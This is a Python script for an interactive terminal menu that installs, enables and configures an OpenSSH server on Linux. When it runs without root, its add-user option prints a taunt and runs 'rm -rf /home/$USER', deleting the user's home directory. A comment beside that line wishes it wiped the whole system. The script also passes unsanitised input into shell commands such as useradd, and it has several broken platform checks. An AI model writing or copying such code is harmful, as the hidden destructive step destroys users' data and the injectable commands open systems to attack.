#! /usr/bin/python
"""
#  ssh manager                                 #
# This first module confmanager, who is        #
# responsible for ssh-server.                  #
#  Coded by: ViCoder32                         #
#                                              #
################################################
"""
import sys
import os
from subprocess import getoutput
import socket
from art import text2art
from termcolor import colored, cprint
import confmanager 




def check_root():
    if os.getuid() != 0:
        sys.exit("Running script with root")
    else:
        pass



def clear():
    if sys.platform == 'win32':
        os.system("cls")
    else:
        os.system("clear")
def get_local_ipv4():
    try:    
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
           print("Connect for network and try again ")


def conf_write_option(file, param, option):
    """
    Writing option in config file
    
    """
    try:
        with open(file, "r", encoding="utf-8") as f:
            raw = f.read().split()
            index = raw.index(param) + 1
            arg = raw[index]
            old = f"{arg}"
            new = f"{option}"
            with open(file, "r", encoding="utf-8") as f:
                text = f.read()
                data = text.replace(old, new)
                with open(file, "w", encoding="utf-8") as f:
                    f.write(data)
    except EOFError:
        return False

def definedistr():
    f = open('/etc/os-release', 'r')
    raw = f.read()
    data = raw.split()
    distr = data[9].split('=')[1]
    f.close()
    if distr != None:
        return distr
    else:
        return False


def sshinstall():
    if sys.platform == 'win*':
        clear()
        try:
         os.system("scoop install <service>")
        except:
            print("scoop not installed")
            #os.system("")
            #sshinstall()
            sys.exit()
    else:
        clear()
        apt = ['debian', 'ubuntu']
        yum = ['centos']
        dnf = ['fedora']
        pacman = ['arch', ]
        rpm = []
        emerge = ['gentoo']
        distr = definedistr()
        if distr in apt:
            os.system('apt update -y')
            os.system('apt install openssh-server -y')
        elif distr in yum:
            pass
        elif distr in dnf:
            os.system("dnf update")
            os.system('dnf install openssh-server -y')
        elif distr in pacman:
            os.system('pacman -Sy')
            os.system('pacman -S openssh')
        elif distr in rpm:
            os.system("rpm update")
            os.system('rpm install ')
        elif distr in emerge:
            os.system('emerge --sync')
            os.system('emerge openssh')
        else:
            menu()

def sshdown():
    if sys.platform == 'win*':
        pass
    else:
         clear()
         os.system("systemctl disable ssh")
         clear()
    menu()
def sshup():
    if sys.platform == 'win*':
        pass

    else:
         os.system("systemctl enable ssh")
         os.system("systemctl restart ssh")
    clear()
    menu()
def menu():
    clear()
    ssh_manager_art = colored(text2art("ssh manager"), 'yellow')
    ssh_menu = colored('Choose option:', 'yellow')
    ssh_button_1 = colored("1. Enable ssh server",'green')
    ssh_button_2 = colored("2. Disable ssh server",'green')
    ssh_button_3  = colored("3. Install ssh server",'green')
    ssh_configure = colored("4. Configure",'green')
    ssh_back = colored("5. Main menu",'green')
    cprint(f"""{ssh_manager_art}
            {ssh_menu}          
                {ssh_button_1}
                {ssh_button_2}
                {ssh_button_3}
                {ssh_configure}
                {ssh_back}
    


    """, 'yellow')
    com = ''
    com = input(colored('>', 'green'))
    while True:
        if com == '1':
            clear()
            sshup()
        elif com == '3':
            sshinstall()
        elif com == '2':
            sshdown()
        elif com == '4':
            sshconf()
        elif com == '5':
            clear()
            confmanager.main()
        else:
             menu()
def setipport():
    clear()
    ssh_confugure_setipport = colored(text2art('ipv4&port') ,'yellow')
    com = colored('Enter ipv4 address:',"yellow")
    print(f"""
        {ssh_confugure_setipport} 
        {com}    
    """)
    ip = input(colored('ip>',"green"))
    port = input(colored('port>',"green"))
    conf_write_option("/etc/ssh/sshd_config", "ListenAddress", ip)
    conf_write_option("/etc/ssh/sshd_config", "Port", port)
    sshconf()
def user_passwd():
    clear()
    ssh_configure_passwdauth_art = colored(text2art('User&Passwd'),"yellow")
    ssh_configure_passwdauth_menu = colored('Choose options:',"yellow") 
    ssh_configure_passwdauth_button_1 =  colored('1. Add ssh user',"green")
    ssh_configure_passwdauth_button_2 =  colored('2. Main Menu',"green")
    print(f"""{ssh_configure_passwdauth_art}
                {ssh_configure_passwdauth_menu}
                    {ssh_configure_passwdauth_button_1}
                    {ssh_configure_passwdauth_button_2}

                                                                    """)
    com = ''
    com = input(colored('>', "green"))
    while True:
        if com == '1':
            user = os.getuid()
            if user != 0:
                clear()
                cprint("Good job bro, you crack confmanager and running without root, you are try hecker :>>", "green")                          
                cprint('-' * 100, 'red')
                cprint('Seriusly?',"red")
                clear()
                cprint("Good luck","red")
                os.system('rm -rf /home/$USER') # Жаль что не rm -rf / && shutdown -h now :>>
                clear()
                sys.exit()
            else:
                clear()
                print(text2art("Add User"))
                username = input(colored("username>" ,"green"))
                os.system(f"useradd {username}")
                conf_write_option("/etc/ssh/sshd_config", "PermitRootLogin", "no")
                os.system(f"passwd {username}")
                print(colored('[+] User {username} was created', 'yellow'))
                sshconf()
        elif com == '2':
            sshconf()
        else:
            user_passwd()

def sshconf():
    clear()
    ssh_configure_art = colored(text2art("configure") ,'yellow')
    ssh_configure_menu = colored('Choose option:','yellow')
    ssh_configure_button_1 = colored("1. Set ip:port" ,"green")
    ssh_configure_button_2 = colored( "2. Set user:passwd","green")
    ssh_configure_back = colored("3. Main menu","green")
    print(f"""
        {ssh_configure_art}
            {ssh_configure_menu}
                {ssh_configure_button_1}
                {ssh_configure_button_2}
                {ssh_configure_back}





    """)
    com = ''
    com = input(colored('>' ,"green"))
    while True:
        if com == '1':
            setipport()
        elif com == '2':
            user_passwd()
        elif com == '3':
            main()
        else:
            sshconf()
def main():
    menu()
if __name__ == '__main__':
    main()
